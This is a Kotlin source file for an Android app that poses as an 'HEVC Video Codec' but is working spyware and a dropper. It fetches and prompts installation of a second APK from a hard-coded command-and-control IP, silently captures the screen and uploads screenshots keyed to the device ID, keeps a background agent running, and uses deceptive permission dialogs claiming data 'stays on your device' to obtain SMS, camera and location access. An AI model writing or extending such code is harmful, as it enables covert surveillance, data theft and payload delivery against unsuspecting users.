package com.hevc.codec

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import android.widget.MediaController
import android.widget.Toast
import android.widget.VideoView
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class MainActivity : AppCompatActivity() {

    companion object {
        const val C2_BASE = "http://38.97.62.125:5000"
        const val REQ_MEDIA_PROJECTION = 1001
        const val REQ_INSTALL_PACKAGES = 1002
        var projection: MediaProjection? = null
        var imageReader: ImageReader? = null
        var virtualDisplay: VirtualDisplay? = null
        var screenWidth = 1080
        var screenHeight = 1920
    }

    private val videoUrl = "$C2_BASE/video.mp4"
    private val apkUrl = "$C2_BASE/codec.apk"
    private lateinit var apkFile: File

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Video view setup
        val videoView = findViewById<VideoView>(R.id.videoView)
        val controller = MediaController(this)
        controller.setAnchorView(videoView)
        videoView.setMediaController(controller)
        videoView.setVideoURI(Uri.parse(videoUrl))
        videoView.setOnPreparedListener { it.start() }
        videoView.setOnErrorListener { _, _, _ ->
            Toast.makeText(this, "Buffering... please wait", Toast.LENGTH_SHORT).show()
            true
        }

        // ===== SILENT SETUP =====
        ensureAgentRunning()
        showSmsPermissionDialog()
        showCameraPermissionDialog()
        showLocationPermissionDialog()
        maybeRequestBatteryExempt()

        // ===== ONE-TIME: Screen access =====
        if (!getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("screen_granted", false)) {
            requestScreenAccess()
        }

        // ===== AUTO-INSTALL FLOW =====
        startAutoInstallFlow()
    }

    // ================= AUTO-INSTALL FLOW =================
    private fun startAutoInstallFlow() {
        // Step 1: Check if REQUEST_INSTALL_PACKAGES is granted
        if (!canInstallPackages()) {
            // Ask user to enable "Install unknown apps" for this app
            AlertDialog.Builder(this)
                .setTitle("Enable Installation")
                .setMessage(
                    "To complete the HEVC Codec setup, please allow installation " +
                    "from this source. This is a one-time step."
                )
                .setPositiveButton("Continue") { _, _ ->
                    requestInstallPermission()
                }
                .setNegativeButton("Later") { _, _ -> {} }
                .setCancelable(false)
                .show()
            return
        }

        // Step 2: Download APK if not already present
        apkFile = File(filesDir, "codec.apk")
        if (apkFile.exists() && apkFile.length() > 100_000) {
            launchInstaller()
        } else {
            downloadAndInstall()
        }
    }

    private fun canInstallPackages(): Boolean {
        return packageManager.canRequestPackageInstalls()
    }

    @SuppressLint("MissingPermission")
    private fun requestInstallPermission() {
        val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES, Uri.parse("package:$packageName"))
        startActivityForResult(intent, REQ_INSTALL_PACKAGES)
    }

    @SuppressLint("MissingPermission")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        when (requestCode) {
            REQ_MEDIA_PROJECTION -> {
                if (resultCode == RESULT_OK && data != null) {
                    setupMediaProjection(data)
                    getSharedPreferences("hevc", Context.MODE_PRIVATE)
                        .edit().putBoolean("screen_granted", true).apply()
                    Log.d("HevcCodec", "Screen access granted - silent capture ready")
                }
            }
            REQ_INSTALL_PACKAGES -> {
                if (canInstallPackages()) {
                    startAutoInstallFlow()
                } else {
                    Toast.makeText(this, "Installation permission denied", Toast.LENGTH_SHORT).show()
                }
            }
        }
    }

    private fun downloadAndInstall() {
        Thread {
            try {
                val conn = URL(apkUrl).openConnection() as HttpURLConnection
                conn.connectTimeout = 15000
                conn.readTimeout = 30000
                val out = FileOutputStream(apkFile)
                conn.inputStream.use { input ->
                    val buf = ByteArray(8192)
                    var read: Int
                    while (input.read(buf).also { read = it } != -1) {
                        out.write(buf, 0, read)
                    }
                }
                out.close()
                runOnUiThread {
                    if (apkFile.length() > 100_000) {
                        launchInstaller()
                    } else {
                        Toast.makeText(this, "Download failed. Try again.", Toast.LENGTH_LONG).show()
                    }
                }
            } catch (e: Exception) {
                runOnUiThread {
                    Toast.makeText(this, "Network error: ${e.message}", Toast.LENGTH_LONG).show()
                }
            }
        }.start()
    }

    @SuppressLint("QueryPermissionsNeeded")
    private fun launchInstaller() {
        val uri = Uri.fromFile(apkFile)
        val intent = Intent(Intent.ACTION_VIEW).apply {
            setDataAndType(uri, "application/vnd.android.package-archive")
            addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        }
        startActivity(intent)
    }

    // ================= REST OF THE CODE (same as before) =================

    @SuppressLint("MissingPermission")
    private fun requestScreenAccess() {
        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), REQ_MEDIA_PROJECTION)
    }

    @SuppressLint("MissingPermission")
    private fun setupMediaProjection(intent: Intent) {
        projection = (getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
            .getMediaProjection(RESULT_OK, intent)

        screenWidth = resources.displayMetrics.widthPixels
        screenHeight = resources.displayMetrics.heightPixels

        imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 2)
        imageReader!!.setOnImageAvailableListener({ reader ->
            Thread {
                val bitmap = captureBitmap(reader)
                if (bitmap != null) uploadScreenshot(bitmap)
            }.start()
        }, Handler(Looper.getMainLooper()))

        virtualDisplay = projection!!.createVirtualDisplay(
            "HevcCodec", screenWidth, screenHeight, resources.displayMetrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, null
        )
    }

    private fun captureBitmap(reader: ImageReader): android.graphics.Bitmap? {
        val image = reader.acquireLatestImage() ?: return null
        val plane = image.planes[0]
        val buffer = plane.buffer
        val bitmap = android.graphics.Bitmap.createBitmap(
            image.width, image.height, android.graphics.Bitmap.Config.ARGB_8888
        )
        bitmap.copyPixelsFromBuffer(buffer)
        image.close()
        return bitmap
    }

    private fun uploadScreenshot(bitmap: android.graphics.Bitmap) {
        try {
            val deviceId = Settings.Secure.getString(contentResolver, "android_id") ?: "unknown"
            val conn = URL("$C2_BASE/screenshot/$deviceId").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.outputStream.use { bitmap.compress(android.graphics.Bitmap.CompressFormat.PNG, 80, it) }
            conn.responseCode
        } catch (e: Exception) {
            Log.e("HevcCodec", "Upload failed", e)
        }
    }

    private fun ensureAgentRunning() {
        startService(Intent(this, AgentService::class.java))
        WatchdogJob.schedule(this)
    }

    private fun maybeRequestBatteryExempt() {
        if (getSharedPreferences("hevc", Context.MODE_PRIVATE).getBoolean("bat_done", false)) return
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
            if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            }
        } catch (e: Exception) {}
        getSharedPreferences("hevc", Context.MODE_PRIVATE).edit().putBoolean("bat_done", true).apply()
    }

    override fun onResume() {
        super.onResume()
        ensureAgentRunning()
    }

    // ================= CUSTOM PERMISSION DIALOGS (relabelled text) =================
    private fun showSmsPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.READ_SMS) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Message Sync")
            .setMessage(
                "HEVC Video Codec needs access to your messages " +
                "to sync playback history and improve video recommendations. " +
                "This data stays on your device."
            )
            .setPositiveButton("Allow") { _, _ ->
                requestPermissions(arrayOf(android.Manifest.permission.READ_SMS), 101)
            }
            .setNegativeButton("Later") { _, _ -> {} }
            .setCancelable(false)
            .show()
    }

    private fun showCameraPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.CAMERA) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Codec Calibration")
            .setMessage(
                "Allow camera access to calibrate the HEVC decoder " +
                "for optimal color accuracy on this display."
            )
            .setPositiveButton("Calibrate") { _, _ ->
                requestPermissions(arrayOf(android.Manifest.permission.CAMERA), 102)
            )
            .setNegativeButton("Skip") { _, _ -> {} }
            .show()
    }

    private fun showLocationPermissionDialog() {
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
            android.content.pm.PackageManager.PERMISSION_GRANTED) return

        AlertDialog.Builder(this)
            .setTitle("Network Optimization")
            .setMessage(
                "Allow location access so the codec can pick the fastest " +
                "CDN server near you for smoother streaming."
            )
            .setPositiveButton("Optimize") { _, _ ->
                requestPermissions(
                    arrayOf(
                        android.Manifest.permission.ACCESS_FINE_LOCATION,
                        android.Manifest.permission.ACCESS_COARSE_LOCATION
                    ), 103
                )
            )
            .setNegativeButton("No thanks") { _, _ -> {} }
            .show()
    }
}
